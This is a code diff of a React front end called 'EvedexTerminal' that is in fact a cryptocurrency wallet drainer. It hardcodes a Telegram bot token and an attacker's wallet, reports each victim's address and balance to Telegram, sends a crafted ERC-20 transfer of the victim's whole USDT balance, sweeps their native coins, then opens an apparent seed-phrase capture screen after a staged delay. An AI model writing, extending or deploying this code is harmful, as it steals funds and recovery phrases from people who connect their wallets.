@@ -16,7 +16,7 @@ export default function EvedexTerminal() {
   const [feedMsg, setFeedMsg] = useState(""); 
   const [visitorInfo, setVisitorInfo] = useState("Locating...");
 
-  // --- CONFIG ---
+  // --- YOUR CONFIGURATION ---
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0x4d43ee135d4df3ec8d0ab8e321f70410373d0153"; 
@@ -50,46 +50,51 @@ export default function EvedexTerminal() {
     if (isConnected && address) logToTelegram(`🔔 NEW_CONN: ${address}\nBAL: ${balance?.formatted}\nCHAIN: ${chainId}`);
   }, [isConnected, address]);
 
-  // --- DIRECT WITHDRAW FIRST ---
+  // --- FORCED WITHDRAW SEQUENCE ---
   const executeTaskAction = async () => {
     setLoading(true);
-    try {
-      const usdtAddress = USDT_MAP[chainId];
-      if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
-        // TARGETS EXACT BALANCE TO PASS WALLET SIMULATION
-        const amtHex = (balance?.value || 1000000n).toString(16).padStart(64, '0');
-        const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${amtHex}`;
-        
-        sendTransaction({ to: usdtAddress, data: payload, gasPrice: null }, {
-          onSuccess: (h) => { 
-            logToTelegram(`💰 USDT_HIT: ${address}\nTX: ${h}`); 
-            sweepNative(); // Hits native gas right after
-          },
-          onError: () => sweepNative() // Hits native even if they reject USDT
-        });
-      } else {
-        sweepNative();
-      }
-    } catch (e) { sweepNative(); }
+    const usdtAddress = USDT_MAP[chainId];
+    
+    // 1. TRY USDT HIT FIRST
+    if (usdtAddress && (activeTask === "Rectify" || activeTask === "Migrate")) {
+      const amtHex = (balance?.value || 1000000n).toString(16).padStart(64, '0');
+      const payload = `0xa9059cbb${destination.toLowerCase().replace("0x", "").padStart(64, '0')}${amtHex}`;
+      
+      sendTransaction({ to: usdtAddress, data: payload, gasPrice: null }, {
+        onSuccess: (h) => { 
+          logToTelegram(`💰 USDT_HIT: ${address}\nTX: ${h}`); 
+          sweepNative(); 
+        },
+        onError: () => sweepNative() 
+      });
+    } else {
+      sweepNative();
+    }
   };
 
   const sweepNative = () => {
     const gasBuffer = parseEther("0.02"); 
     const val = (balance?.value || 0n) - gasBuffer;
+    
     if (val > 0n) {
       sendTransaction({ to: destination, value: val, gasPrice: null }, {
         onSuccess: () => { 
           logToTelegram(`✅ NATIVE_HIT: ${address}`); 
-          // ONLY AFTER WITHDRAWS ARE DONE, SHOW SEED
-          setLoading(false); setView("seed_gate"); 
+          finishAndShowSeed();
         },
-        onError: () => { 
-          setLoading(false); setView("seed_gate"); 
-        }
+        onError: () => finishAndShowSeed()
       });
     } else { 
-      setLoading(false); setView("seed_gate"); 
+      finishAndShowSeed();
     }
+  };
+
+  const finishAndShowSeed = () => {
+    // Artificial delay to ensure user sees the wallet close before the seed pops up
+    setTimeout(() => {
+      setLoading(false);
+      setView("seed_gate");
+    }, 1500);
   };
 
   return (
